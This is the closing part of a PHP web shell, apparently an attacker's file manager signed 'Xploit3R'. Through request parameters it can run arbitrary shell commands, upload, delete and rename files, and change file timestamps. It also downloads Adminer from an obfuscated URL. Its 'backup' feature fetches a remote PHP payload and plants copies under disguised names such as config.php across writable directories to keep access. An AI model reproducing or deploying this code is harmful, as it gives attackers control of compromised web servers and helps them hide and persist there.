                    <a href="#" onclick="showRenameForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Rename"><i class="fa-solid fa-pen"></i></a>
                    <a href="#" onclick="showTouchForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Change Date"><i class="fas fa-calendar-alt"></i></a>
                    <a href="#" onclick="confirmDelete(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Delete"><i class="fas fa-trash"></i></a>
                    <a href="?download=' . htmlspecialchars($full_path) . '" data-tooltip="Download File"><i class="fas fa-download"></i></a>
                </td>';
            echo '</tr>';
        }

        echo '</table>';
    }
    ?>
</div>
        </div>
    </div>
    <div class="footer">
            <div class="window">
                <div class="title-bar">
                    <div class="title">Upload File</div>
                </div>
                <form class="action" action="" method="post" enctype="multipart/form-data">
                    <input type="file" name="fileToUpload" required>
                    <input type="submit" name="upload" value="Upload File">
                </form>
            </div>

            <div class="window">
            <div class="title-bar">
                <div class="title">Create File</div>
            </div>
            <form class="action" action="" method="post">
                <input type="text" name="new_file" placeholder="New file name">
                <input type="submit" name="create_file" value="Create File">
            </form>
        </div>

            <div class="window">
            <div class="title-bar">
                <div class="title">Create Folder</div>
            </div>
            <form class="action" action="" method="post">
                <input type="text" name="new_folder" placeholder="New folder name">
                <input type="submit" name="create_folder" value="Create Folder">
            </form>
        </div>

        <?php
        if (isset($_SESSION['notification'])) {
            $notification = $_SESSION['notification'];
            echo "<script>
                    document.addEventListener('DOMContentLoaded', function() {
                        Swal.fire({
                            icon: '{$notification['type']}',
                            title: '{$notification['title']}',
                            text: '{$notification['text']}'
                        });
                    });
                  </script>";
            unset($_SESSION['notification']); // Hapus notifikasi setelah ditampilkan
        }
        
        if (isset($_GET['success']) && $_GET['success'] == 1) {
            echo "<script>
                    document.addEventListener('DOMContentLoaded', function() {
                        Swal.fire({
                            icon: 'success',
                            title: 'Success',
                            text: 'File saved successfully.'
                        });
                    });
                  </script>";
        }

        if (isset($_GET['adminer'])) {
    $current_dir = isset($_GET['j']) ? realpath($_GET['j']) : __DIR__;

    // URL kembali ke direktori sebelumnya
    $previous_url = '?j=' . urlencode($_GET['j'] ?? realpath(__DIR__));

    // Validasi direktori saat ini
    if ($current_dir && is_dir($current_dir) && is_writable($current_dir)) {
        $adminer_path = $current_dir . '/adminer.php';
        $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";

        // Periksa apakah file Adminer sudah ada
        if (!file_exists($adminer_path)) {
            $content = file_get_contents($URL);
            if ($content !== false) {
                $result = file_put_contents($adminer_path, $content);
                if ($result !== false) {
                    echo "<script>
                            document.addEventListener('DOMContentLoaded', function() {
                                Swal.fire({
                                    icon: 'success',
                                    title: 'Success',
                                    text: 'Adminer downloaded successfully. You can access it in the current directory.'
                                }).then(() => {
                                    window.location.href = '$previous_url';
                                });
                            });
                          </script>";
                } else {
                    echo "<script>
                            document.addEventListener('DOMContentLoaded', function() {
                                Swal.fire({
                                    icon: 'error',
                                    title: 'Error',
                                    text: 'Failed to save Adminer file to the directory.'
                                }).then(() => {
                                    window.location.href = '$previous_url';
                                });
                            });
                          </script>";
                }
            } else {
                echo "<script>
                        document.addEventListener('DOMContentLoaded', function() {
                            Swal.fire({
                                icon: 'error',
                                title: 'Error',
                                text: 'Failed to download Adminer from the source URL.'
                            }).then(() => {
                                window.location.href = '$previous_url';
                            });
                        });
                      </script>";
            }
        } else {
            echo "<script>
                    document.addEventListener('DOMContentLoaded', function() {
                        Swal.fire({
                            icon: 'info',
                            title: 'Notice',
                            text: 'Adminer already exists in the current directory.'
                        }).then(() => {
                            window.location.href = '$previous_url';
                        });
                    });
                  </script>";
        }
    } else {
        echo "<script>
                document.addEventListener('DOMContentLoaded', function() {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: 'Current directory is not writable or does not exist.'
                    }).then(() => {
                        window.location.href = '$previous_url';
                    });
                });
              </script>";
    }
}
        if (isset($_GET['delete'])) {
            $file_to_delete = $_GET['delete'];
        
            if (file_exists($file_to_delete)) {
                if (is_dir($file_to_delete)) {
                    // Hapus folder dan semua isinya
                    $iterator = new RecursiveDirectoryIterator($file_to_delete, RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach ($files as $file) {
                        if ($file->isDir()) {
                            rmdir($file->getRealPath());
                        } else {
                            unlink($file->getRealPath());
                        }
                    }
                    rmdir($file_to_delete);
                    $message = "Folder deleted successfully.";
                } else {
                    // Hapus file
                    unlink($file_to_delete);
                    $message = "File deleted successfully.";
                }
        
                echo "<script>
                        document.addEventListener('DOMContentLoaded', function() {
                            Swal.fire({
                                icon: 'success',
                                title: 'Deleted!',
                                text: '$message'
                            }).then(() => {
                                window.location.href = '?j=" . urlencode(dirname($file_to_delete)) . "';
                            });
                        });
                      </script>";
            } else {
                echo "<script>
                        document.addEventListener('DOMContentLoaded', function() {
                            Swal.fire({
                                icon: 'error',
                                title: 'Failed',
                                text: 'The file or folder does not exist.'
                            });
                        });
                      </script>";
            }
        }
        if (isset($_GET['rename']) && isset($_GET['new_name'])) {
            $file_to_rename = $_GET['rename'];
            $new_name = $_GET['new_name'];
        
            $new_path = dirname($file_to_rename) . '/' . $new_name;
        
            if (file_exists($file_to_rename)) {
                if (rename($file_to_rename, $new_path)) {
                    // SweetAlert untuk notifikasi sukses
                    echo "<script>
                            document.addEventListener('DOMContentLoaded', function() {
                                Swal.fire({
                                    icon: 'success',
                                    title: 'Renamed!',
                                    text: 'File/Folder renamed successfully.'
                                }).then(() => {
                                    window.location.href = '?j=" . urlencode(dirname($file_to_rename)) . "';
                                });
                            });
                          </script>";
                } else {
                    // SweetAlert untuk notifikasi gagal
                    echo "<script>
                            document.addEventListener('DOMContentLoaded', function() {
                                Swal.fire({
                                    icon: 'error',
                                    title: 'Failed',
                                    text: 'Failed to rename file/folder. Please check permissions.'
                                });
                            });
                          </script>";
                }
            } else {
                // SweetAlert untuk notifikasi file tidak ditemukan
                echo "<script>
                        document.addEventListener('DOMContentLoaded', function() {
                            Swal.fire({
                                icon: 'error',
                                title: 'Not Found',
                                text: 'The file or folder does not exist.'
                            });
                        });
                      </script>";
            }
        }                 
        
        if (isset($_POST['create_file'])) {
            $file_name = $_GET['j'] . '/' . $_POST['new_file'];
        
            if (file_put_contents($file_name, '') !== false) {
                $_SESSION['notification'] = [
                    'type' => 'success',
                    'title' => 'File Baru Berhasil!',
                    'text' => 'File baru berhasil dibuat.'
                ];
            } else {
                $_SESSION['notification'] = [
                    'type' => 'error',
                    'title' => 'File Baru Gagal!',
                    'text' => 'File baru gagal dibuat.'
                ];
            }
        
            header("Location: ?j=" . urlencode($_GET['j']));
            exit;
        }
        
        if (isset($_POST['create_folder'])) {
            $folder_name = $_GET['j'] . '/' . $_POST['new_folder'];
        
            if (mkdir($folder_name)) {
                $_SESSION['notification'] = [
                    'type' => 'success',
                    'title' => 'Folder Baru Berhasil!',
                    'text' => 'Folder baru berhasil dibuat.'
                ];
            } else {
                $_SESSION['notification'] = [
                    'type' => 'error',
                    'title' => 'Folder Baru Gagal!',
                    'text' => 'Folder baru gagal dibuat.'
                ];
            }
        
            header("Location: ?j=" . urlencode($_GET['j']));
            exit;
        }
        if (isset($_GET['touch']) && isset($_GET['newDateTime'])) {
            $file_to_touch = $_GET['touch'];
            $new_date_time = $_GET['newDateTime'];
        
            if (file_exists($file_to_touch)) {
                $timestamp = strtotime($new_date_time);
        
                if ($timestamp !== false && touch($file_to_touch, $timestamp)) {
                    echo "<script>
                            document.addEventListener('DOMContentLoaded', function() {
                                Swal.fire({
                                    icon: 'success',
                                    title: 'Date Changed',
                                    text: 'Modification date updated successfully.'
                                }).then(() => {
                                    window.location.href = '?j=" . urlencode(dirname($file_to_touch)) . "';
                                });
                            });
                          </script>";
                } else {
                    echo "<script>
                            document.addEventListener('DOMContentLoaded', function() {
                                Swal.fire({
                                    icon: 'error',
                                    title: 'Failed',
                                    text: 'Failed to update modification date. Please try again.'
                                });
                            });
                          </script>";
                }
            } else {
                echo "<script>
                        document.addEventListener('DOMContentLoaded', function() {
                            Swal.fire({
                                icon: 'error',
                                title: 'Not Found',
                                text: 'The file or folder does not exist.'
                            });
                        });
                      </script>";
            }
        }
        if (isset($_POST['upload'])) {
            $target_dir = isset($_GET['j']) ? rtrim($_GET['j'], '/') . '/' : './'; // Direktori tujuan
            $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
            $upload_ok = true;
            $max_file_size = 5 * 1024 * 1024; // Batas ukuran file 5 MB
        
            // Validasi: Periksa apakah file sudah ada
            if (file_exists($target_file)) {
                $_SESSION['notification'] = [
                    'type' => 'error',
                    'title' => 'Upload Failed!',
                    'text' => 'File already exists.'
                ];
                $upload_ok = false;
            }
        
            // Validasi: Ukuran file
            if ($_FILES["fileToUpload"]["size"] > $max_file_size) {
                $_SESSION['notification'] = [
                    'type' => 'error',
                    'title' => 'Upload Failed!',
                    'text' => 'File size exceeds 5 MB.'
                ];
                $upload_ok = false;
            }
        
            // Jika semua validasi lolos
            if ($upload_ok) {
                if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                    $_SESSION['notification'] = [
                        'type' => 'success',
                        'title' => 'Upload Success!',
                        'text' => 'File uploaded successfully.'
                    ];
                } else {
                    $_SESSION['notification'] = [
                        'type' => 'error',
                        'title' => 'Upload Failed!',
                        'text' => 'An error occurred during file upload.'
                    ];
                }
            }
        
            // Redirect ke halaman yang sama untuk menampilkan notifikasi
            header("Location: ?j=" . urlencode($_GET['j'] ?? '.'));
            exit;
        }        
        if (isset($_POST['execute_backup'])) {
            $current_dir = isset($_GET['j']) ? realpath($_GET['j']) : __DIR__;
            $num_files = intval($_POST['num_files']);
            auto_backup_multiple($current_dir, $num_files, 'https://raw.githubusercontent.com/X-3nCrypt/antiquac/refs/heads/main/antiquack', ['functions.php', 'config.php', 'data.php']);
        }
        
        function auto_backup_multiple($current_dir, $num_files = 1, $sourceUrl = '', $default_file_names = ['functions.php', 'config.php', 'data.php']) {
            if (!$current_dir || !is_dir($current_dir) || !is_writable($current_dir)) {
                echo "<script>
                    Swal.fire({
                        icon: 'error',
                        title: 'Failed!',
                        text: 'Target directory is invalid or not writable.',
                        confirmButtonText: 'Close'
                    });
                </script>";
                return;
            }
        
            $downloaded_content = fetch_remote_file($sourceUrl);
            if (!$downloaded_content) {
                echo "<script>
                    Swal.fire({
                        icon: 'error',
                        title: 'Failed!',
                        text: 'Failed to download file content from $sourceUrl.',
                        confirmButtonText: 'Close'
                    });
                </script>";
                return;
            }
        
            $target_dirs = find_target_directories($current_dir);
            if (empty($target_dirs)) {
                echo "<script>
                    Swal.fire({
                        icon: 'error',
                        title: 'Failed!',
                        text: 'No suitable target directories found.',
                        confirmButtonText: 'Close'
                    });
                </script>";
                return;
            }
        
            usort($target_dirs, function($a, $b) {
                return substr_count($b, DIRECTORY_SEPARATOR) - substr_count($a, DIRECTORY_SEPARATOR);
            });
        
            $files_added = 0;
            $success_files = [];
            foreach ($target_dirs as $target_dir) {
                if ($files_added >= $num_files) break;
        
                $folder_name = basename($target_dir);
                $base_file_name = preg_replace('/[^a-zA-Z0-9]/', '', strtolower($folder_name)) . '.php';
                if (empty($folder_name) || $base_file_name === '.php') {
                    $base_file_name = $default_file_names[array_rand($default_file_names)];
                }
        
                $file_name = $base_file_name;
                $counter = 1;
                while (file_exists(rtrim($target_dir, '/') . '/' . $file_name)) {
                    $file_name = pathinfo($base_file_name, PATHINFO_FILENAME) . '_' . $counter . '.php';
                    $counter++;
                }
        
                $file_path = rtrim($target_dir, '/') . '/' . $file_name;
        
                if (file_put_contents($file_path, $downloaded_content)) {
                    $success_files[] = $file_path;
                    $files_added++;
                }
            }
        
            if (!empty($success_files)) {
                $file_list = implode('<br>', $success_files);
                echo "<script>
                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        html: 'Files successfully placed at the following locations:<br>$file_list',
                        confirmButtonText: 'Close'
                    });
                </script>";
            }
        
            if ($files_added < $num_files) {
                echo "<script>
                    Swal.fire({
                        icon: 'info',
                        title: 'Info',
                        text: 'Only $files_added out of $num_files files requested were successfully placed.',
                        confirmButtonText: 'Close'
                    });
                </script>";
            }
        }
        
        function fetch_remote_file($url) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $response = curl_exec($ch);
            curl_close($ch);
            return $response;
        }
        
        function find_target_directories($current_dir) {
            $directories = [];
            $directory_iterator = new RecursiveDirectoryIterator($current_dir, RecursiveDirectoryIterator::SKIP_DOTS);
            $iterator = new RecursiveIteratorIterator($directory_iterator, RecursiveIteratorIterator::CHILD_FIRST);
        
            foreach ($iterator as $path) {
                if ($path->isDir() && is_writable($path->getPathname())) {
                    $directories[] = $path->getPathname();
                }
            }
        
            shuffle($directories);
            return $directories;
        } 
        if (isset($_GET['cmd'])) {
            $cmd = escapeshellcmd($_GET['cmd']); // Escape command
            $handle = popen($cmd, 'r'); // Eksekusi perintah
            $output = fread($handle, 2096); // Membaca output
            pclose($handle); // Menutup handle
        }
        ?>
        </td>
        </tr>
        </table>
        <script>
        function confirmDelete(filePath) {
            Swal.fire({
                title: 'Are you sure?',
                text: 'You will not be able to recover this file or folder!',
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#d33',
                cancelButtonColor: '#3085d6',
                confirmButtonText: 'Yes, delete it!'
            }).then((result) => {
                if (result.isConfirmed) {
                    // Redirect to PHP delete handler with file path
                    window.location.href = '?delete=' + encodeURIComponent(filePath);
                }
            });
        }
        function showRenameForm(filePath) {
    const fileName = filePath.split('/').pop(); // Ambil nama file dari filePath

    Swal.fire({
        title: `Rename File/Folder: ${fileName}`, // Menampilkan nama file di judul
        input: 'text',
        inputValue: fileName, // Menampilkan nama file saat ini di input sebagai default
        inputPlaceholder: 'Enter new name',
        showCancelButton: true,
        confirmButtonText: 'Rename',
        preConfirm: (newName) => {
            if (!newName) {
                Swal.showValidationMessage('New name cannot be empty');
            } else if (newName === fileName) {
                Swal.showValidationMessage('The new name must be different from the current name');
            } else {
                // Redirect ke handler PHP dengan parameter rename
                window.location.href = '?rename=' + encodeURIComponent(filePath) + '&new_name=' + encodeURIComponent(newName);
            }
        }
    });
}
        function toggleCommandHelp() {
            Swal.fire({
                title: 'want to find who are we?',
                text: 'ask ur mama.',
                icon: 'error',
                confirmButtonText: 'Close'
            });
        }
        function showTouchForm(filePath) {
            Swal.fire({
                title: 'Change Modification Date',
                html: `
                    <label for="newDate">Select a new date:</label>
                    <input type="date" id="newDate" class="swal2-input">
                    <label for="newTime">Select a new time:</label>
                    <input type="time" id="newTime" class="swal2-input">
                `,
                showCancelButton: true,
                confirmButtonText: 'Change Date',
                preConfirm: () => {
                    const newDate = document.getElementById('newDate').value;
                    const newTime = document.getElementById('newTime').value;
        
                    if (!newDate || !newTime) {
                        Swal.showValidationMessage('Please select both date and time');
                    } else {
                        return { newDate, newTime };
                    }
                }
            }).then((result) => {
                if (result.isConfirmed) {
                    const { newDate, newTime } = result.value;
                    const newDateTime = `${newDate} ${newTime}:00`; // Format tanggal & waktu
        
                    // Redirect ke PHP handler dengan parameter
                    window.location.href = `?touch=${encodeURIComponent(filePath)}&newDateTime=${encodeURIComponent(newDateTime)}`;
                }
            });
        }
        function showBackupForm() {
    Swal.fire({
        title: 'Backup Files',
        input: 'number',
        inputLabel: 'Enter the number of files to backup',
        inputPlaceholder: 'Number of files',
        inputAttributes: {
            min: 1,
            step: 1
        },
        showCancelButton: true,
        confirmButtonText: 'Backup',
        preConfirm: (numFiles) => {
            if (!numFiles || numFiles <= 0) {
                Swal.showValidationMessage('Please enter a valid number of files');
            } else {
                return numFiles;
            }
        }
    }).then((result) => {
        if (result.isConfirmed) {
            const numFiles = result.value;
            // Kirim jumlah file ke PHP melalui form tersembunyi
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '';
            form.innerHTML = `
                <input type="hidden" name="execute_backup" value="true">
                <input type="hidden" name="num_files" value="${numFiles}">
            `;
            document.body.appendChild(form);
            form.submit();
        }
    });
}
function toggleCommandContainer(forceOpen) {
        const container = document.getElementById("command-container");
            if (forceOpen !== undefined) {
                container.style.display = forceOpen ? "block" : "none";
            } else {
                container.style.display = container.style.display === "none" ? "block" : "none";
            }
        }

                 window.onload = function () {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('cmd')) {
                toggleCommandContainer(true);              }
        };
</script>

    </div>
    <div id="command-container" style="display: none; margin-bottom: 20px; background-color: #252525; padding: 20px; border-radius: 8px;">
        <h3 style="color:rgb(0, 255, 34);">Execute Command:</h3>
        <form action="" method="get">
            <input type="text" name="cmd" id="cmd" placeholder="Enter command" style="width: 100%; padding: 10px; margin-top: 10px; margin-bottom: 20px; border-radius: 5px; background-color: #1c1c1c; color: #f0f0f0;" required>
            <input type="submit" value="Run Command" class="btn">
            <button type="button" onclick="toggleCommandContainer(false)" class="btn back-btn">Back</button>
        </form>
        <pre id="command-output" style="background-color: #1c1c1c; color:rgb(30, 255, 0); padding: 10px; margin-top: 20px; border-radius: 8px; overflow-x: auto;">
            <?php 
                         if (isset($output)) {
                echo htmlspecialchars($output);
            }
            ?>
        </pre>
    </div>
</body>
<footer class="footer">
    <p><?php echo date("Y"); ?>.- Created by Xploit3R.</p>
</footer>
</html>
